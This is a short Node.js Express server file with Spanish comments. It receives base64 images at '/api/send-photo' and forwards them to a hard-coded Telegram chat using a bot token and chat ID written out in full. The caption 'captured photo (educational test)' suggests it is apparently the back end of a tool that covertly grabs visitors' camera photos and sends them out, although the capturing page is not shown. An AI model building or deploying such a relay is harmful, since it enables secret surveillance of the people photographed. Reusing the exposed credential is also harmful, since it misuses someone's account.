const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const app = express();

app.use(express.json({ limit: '10mb' })); // Aumentar límite para imágenes

// Reemplaza con tu token y chat ID
const token = '8312820058:AAGF_5rI1JuoRo-bi8PNoQHn41jcojCiqds';
const chatId = '-4981054241';
const bot = new TelegramBot(token);

app.post('/api/send-photo', (req, res) => {
  const { photo } = req.body;

  // Convertir base64 a buffer
  const base64Data = photo.replace(/^data:image\/png;base64,/, '');
  const buffer = Buffer.from(base64Data, 'base64');

  // Enviar la foto al chat de Telegram
  bot.sendPhoto(chatId, buffer, { caption: 'Foto capturada (Prueba educativa)' })
    .then(() => {
      res.json({ message: 'Foto enviada con éxito' });
    })
    .catch(err => {
      console.error(err);
      res.status(500).json({ message: 'Error al enviar la foto' });
    });
});

module.exports = app;